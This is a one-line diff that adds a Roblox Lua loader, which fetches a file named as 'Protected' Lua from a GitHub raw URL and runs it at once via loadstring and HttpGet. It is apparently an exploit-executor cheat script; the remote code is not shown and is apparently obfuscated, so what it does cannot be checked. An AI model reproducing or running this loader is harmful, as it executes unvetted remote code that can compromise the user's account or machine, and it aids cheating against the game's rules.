@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Elmerhub/script/main/Protected_8668858472136156.lua.txt"))()
